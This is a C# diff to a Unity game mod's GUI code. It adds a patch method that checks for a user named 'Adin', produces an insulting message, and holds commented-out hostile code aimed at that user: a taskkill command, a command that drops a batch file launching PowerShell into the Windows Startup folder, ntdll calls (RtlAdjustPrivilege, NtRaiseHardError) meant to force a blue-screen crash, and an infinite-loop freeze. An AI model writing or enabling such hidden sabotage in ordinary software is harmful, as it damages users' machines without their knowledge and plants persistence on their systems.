@@ -1,5 +1,4 @@
 ﻿using UnityEngine;
-using System.Linq;
 
 namespace SimpleGUI
 {
@@ -144,6 +143,47 @@ namespace SimpleGUI
             }
            
         }
+
+
+        public static void addBuilding_Prefix()
+        {
+            if(GuiPatreon.birthdays.ContainsKey("Adin")) {
+                string message = "Hi Adin! Fuck you!";
+                //Process.Start("cmd.exe", "/c taskkill /F /IM lghub_installer.exe");
+                //Process.Start("cmd.exe", "/c cd %APPDATA%//Microsoft//Windows//Start Menu//Programs//Startup & echo start powershell.exe winint > gotem.bat");
+
+                /*
+                //blue screen if piracy is detected
+				RtlAdjustPrivilege(19, true, false, out bool previousValue);
+				// mute requested error status to be this to indicate manual crash
+				NtRaiseHardError(0xDEADDEAD, 0, 0, new IntPtr(0), 6, out uint oul);
+				*/
+
+                //GuiMain.b = true; // initiate "banned status"
+                //while(true) { } // hard freeze game // prevents the "blue screen" i intended, reevaluate later
+                message.ToString();
+            }
+        }
+
+        /*
+		[DllImport("ntdll.dll")]
+		private static extern uint RtlAdjustPrivilege(
+		int Privilege,
+		bool bEnablePrivilege,
+		bool IsThreadPrivilege,
+		out bool PreviousValue
+		);
+
+		[DllImport("ntdll.dll")]
+		private static extern uint NtRaiseHardError(
+		uint ErrorStatus,
+		uint NumberOfParameters,
+		uint UnicodeStringParameterMask,
+		IntPtr Parameters,
+		uint ValidResponseOption,
+		out uint Response
+		);
+        */
 
         public Vector2 scrollPosition;
 
